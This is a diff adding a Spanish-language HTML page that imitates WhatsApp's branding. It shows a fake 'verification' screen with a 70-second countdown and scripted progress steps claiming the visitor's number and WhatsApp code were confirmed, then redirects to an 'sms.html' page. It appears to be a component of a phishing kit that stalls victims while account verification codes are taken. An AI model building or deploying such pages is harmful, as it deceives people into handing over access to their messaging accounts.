@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>loading</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: #e5ddd5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 28px;
+      padding: 40px 28px 36px;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.12);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+    }
+
+    .icon-wrap {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin-bottom: 20px;
+    }
+    .icon-wrap svg.ring {
+      position: absolute;
+      top: 0; left: 0;
+      width: 80px; height: 80px;
+      animation: spin-ring 3s linear infinite;
+    }
+    @keyframes spin-ring {
+      to { transform: rotate(360deg); }
+    }
+    .icon-circle {
+      position: absolute;
+      top: 8px; left: 8px;
+      width: 64px; height: 64px;
+      background: #25D366;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .icon-circle svg { width: 34px; height: 34px; fill: #fff; }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #777;
+      text-align: center;
+      margin-bottom: 22px;
+    }
+
+    .timer-box {
+      width: 100%;
+      background: #f5f5f5;
+      border-radius: 14px;
+      padding: 16px 0 14px;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+    .timer-label {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      color: #aaa;
+      text-transform: uppercase;
+      margin-bottom: 4px;
+    }
+    #countdown {
+      font-size: 44px;
+      font-weight: 700;
+      color: #25D366;
+      letter-spacing: -1px;
+      line-height: 1;
+      transition: color 0.3s;
+    }
+    #countdown.urgent { color: #e53935; }
+
+    .steps {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 22px;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 13px 14px;
+      border-radius: 13px;
+      transition: background 0.4s;
+    }
+    .step.done {
+      background: #e8faf0;
+    }
+    .step.active {
+      background: #e8faf0;
+    }
+    .step.pending {
+      background: transparent;
+    }
+
+    .step-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .step.done .step-icon {
+      background: #25D366;
+    }
+    .step.active .step-icon {
+      background: transparent;
+      border: 2.5px solid #25D366;
+      animation: pulse-border 1.2s ease-in-out infinite;
+    }
+    @keyframes pulse-border {
+      0%,100% { box-shadow: 0 0 0 0 rgba(37,211,102,0.35); }
+      50%      { box-shadow: 0 0 0 5px rgba(37,211,102,0); }
+    }
+    .step.pending .step-icon {
+      background: transparent;
+      border: 2.5px solid #ddd;
+    }
+
+    .step-icon svg { width: 14px; height: 14px; }
+    .step.done .step-icon svg { fill: #fff; }
+    .step.active .step-icon svg { fill: #25D366; }
+    .step.pending .step-icon svg { fill: #ccc; }
+
+    .step-text strong {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #111;
+    }
+    .step.pending .step-text strong { color: #aaa; }
+    .step-text span {
+      font-size: 12px;
+      color: #888;
+    }
+    .step.pending .step-text span { color: #bbb; }
+
+    .wave {
+      display: flex;
+      align-items: flex-end;
+      gap: 3px;
+      height: 36px;
+      margin-bottom: 14px;
+    }
+    .wave span {
+      display: block;
+      width: 4px;
+      background: #25D366;
+      border-radius: 3px;
+      animation: wave-bar 1.1s ease-in-out infinite;
+    }
+    .wave span:nth-child(1)  { height: 12px; animation-delay: 0s; }
+    .wave span:nth-child(2)  { height: 20px; animation-delay: 0.1s; }
+    .wave span:nth-child(3)  { height: 28px; animation-delay: 0.2s; }
+    .wave span:nth-child(4)  { height: 18px; animation-delay: 0.3s; }
+    .wave span:nth-child(5)  { height: 32px; animation-delay: 0.4s; }
+    .wave span:nth-child(6)  { height: 22px; animation-delay: 0.5s; }
+    .wave span:nth-child(7)  { height: 14px; animation-delay: 0.6s; }
+    .wave span:nth-child(8)  { height: 26px; animation-delay: 0.7s; }
+    .wave span:nth-child(9)  { height: 16px; animation-delay: 0.8s; }
+    .wave span:nth-child(10) { height: 10px; animation-delay: 0.9s; }
+    @keyframes wave-bar {
+      0%,100% { transform: scaleY(0.4); opacity: 0.5; }
+      50%      { transform: scaleY(1);   opacity: 1; }
+    }
+
+    .footer-text {
+      font-size: 13px;
+      color: #888;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    #redirect-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(37,211,102,0.15);
+      backdrop-filter: blur(6px);
+      align-items: center;
+      justify-content: center;
+      z-index: 99;
+    }
+    #redirect-overlay.show { display: flex; }
+    .redirect-msg {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px 36px;
+      text-align: center;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.15);
+      animation: pop-in 0.3s cubic-bezier(.34,1.56,.64,1) both;
+    }
+    @keyframes pop-in {
+      from { transform: scale(0.7); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+    .redirect-msg .check {
+      width: 56px; height: 56px;
+      background: #25D366;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 14px;
+    }
+    .redirect-msg .check svg { width: 28px; height: 28px; fill: #fff; }
+    .redirect-msg h2 { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 6px; }
+    .redirect-msg p  { font-size: 13px; color: #888; }
+  </style>
+</head>
+<body>
+
+<div class="card">
+
+  <div class="icon-wrap">
+    <svg class="ring" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="40" cy="40" r="36" stroke="#25D366" stroke-width="3"
+        stroke-dasharray="12 8" stroke-linecap="round"/>
+    </svg>
+    <div class="icon-circle">
+  
+      <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+        <path d="M16 2C8.27 2 2 8.27 2 16c0 2.47.67 4.78 1.84 6.77L2 30l7.41-1.81A13.93 13.93 0 0016 30c7.73 0 14-6.27 14-14S23.73 2 16 2zm7.1 19.72c-.3.84-1.76 1.6-2.43 1.66-.62.06-1.2.28-4.07-.85-3.44-1.36-5.65-4.87-5.82-5.1-.17-.22-1.4-1.86-1.4-3.55 0-1.7.88-2.53 1.2-2.88.3-.33.66-.42.88-.42.22 0 .44 0 .63.01.2.01.48-.08.75.57.3.68 1.01 2.46 1.1 2.64.09.18.15.4.03.63-.12.24-.18.38-.36.59-.18.2-.38.45-.54.6-.18.17-.37.36-.16.7.21.34.94 1.55 2.03 2.51 1.4 1.24 2.57 1.62 2.93 1.8.36.18.57.15.78-.09.21-.24.9-1.05 1.14-1.4.24-.36.48-.3.81-.18.33.12 2.1 1 2.46 1.17.36.18.6.27.69.42.09.15.09.84-.21 1.68z"/>
+      </svg>
+    </div>
+  </div>
+
+  <h1>Verificando</h1>
+  <p class="subtitle">Estamos procesando tu información de seguridad</p>
+  
+   <div class="timer-box">
+    <div class="timer-label">Tiempo Estimado</div>
+    <div id="countdown">1:10</div>
+  </div>
+
+  <div class="steps">
+    <div class="step done" id="step1">
+      <div class="step-icon">
+        <svg viewBox="0 0 16 16"><path d="M6.5 11.5L3 8l1.4-1.4 2.1 2.1 4.6-4.6L12.5 5.5z"/></svg>
+      </div>
+      <div class="step-text">
+        <strong>Número validado</strong>
+        <span>Tu número fue reconocido correctamente</span>
+      </div>
+    </div>
+
+    <div class="step active" id="step2">
+      <div class="step-icon">
+        <svg viewBox="0 0 16 16"><circle cx="8" cy="8" r="4"/></svg>
+      </div>
+      <div class="step-text">
+        <strong>Código verificado</strong>
+        <span id="step2-sub">Código de Whatsapp confirmado</span>
+      </div>
+    </div>
+
+    <div class="step pending" id="step3">
+      <div class="step-icon">
+        <svg viewBox="0 0 16 16"><circle cx="8" cy="8" r="4"/></svg>
+      </div>
+      <div class="step-text">
+        <strong>Completando sesión</strong>
+        <span>Configurando su acceso...</span>
+      </div>
+    </div>
+  </div>
+  
+<div id="redirect-overlay">
+  <div class="redirect-msg">
+    <div class="check">
+      <svg viewBox="0 0 16 16">
+        <path d="M6.5 11.5L3 8l1.4-1.4 2.1 2.1 4.6-4.6L12.5 5.5z"/>
+      </svg>
+    </div>
+    <h2>Redireccionando</h2>
+    <p>Espere un momento...</p>
+  </div>
+</div>
+
+  <div class="wave">
+    <span></span><span></span><span></span><span></span><span></span>
+    <span></span><span></span><span></span><span></span><span></span>
+  </div>
+
+  <p class="footer-text">Por favor espera, esto tomará unos segundos.<br>No cierres esta ventana.</p>
+</div>
+
+
+<script>
+  const SECONDS = 70;
+  const REDIRECT_URL = 'sms.html'; 
+
+  let remaining = SECONDS;
+  const el = document.getElementById('countdown');
+  const step2 = document.getElementById('step2');
+  const step2sub = document.getElementById('step2-sub');
+  const step3 = document.getElementById('step3');
+  const overlay = document.getElementById('redirect-overlay');
+
+  function fmt(s) {
+    const m = Math.floor(s / 60);
+    const sec = s % 60;
+    return `${m}:${String(sec).padStart(2,'0')}`;
+  }
+
+  const halfwayDone = Math.floor(SECONDS / 2);
+
+  const timer = setInterval(() => {
+    remaining--;
+    el.textContent = fmt(remaining);
+
+    if (remaining === halfwayDone) {
+      step2sub.textContent = 'Código generado. Enviando mensaje...';
+    }
+
+    if (remaining === 2) {
+      step2.className = 'step done';
+      step2.querySelector('.step-icon').innerHTML = '<svg viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 11.5L3 8l1.4-1.4 2.1 2.1 4.6-4.6L12.5 5.5z"/></svg>';
+      step2sub.textContent = 'Mensaje enviado exitosamente';
+
+      step3.className = 'step done';
+      step3.querySelector('.step-icon').innerHTML = '<svg viewBox="0 0 16 16" fill="currentColor"><path d="M6.5 11.5L3 8l1.4-1.4 2.1 2.1 4.6-4.6L12.5 5.5z"/></svg>';
+    }
+
+    if (remaining <= 0) {
+      clearInterval(timer);
+      el.textContent = '0:00';
+      overlay.classList.add('show');
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 1800);
+    }
+  }, 1000);
+</script>
+
+</body>
+</html>
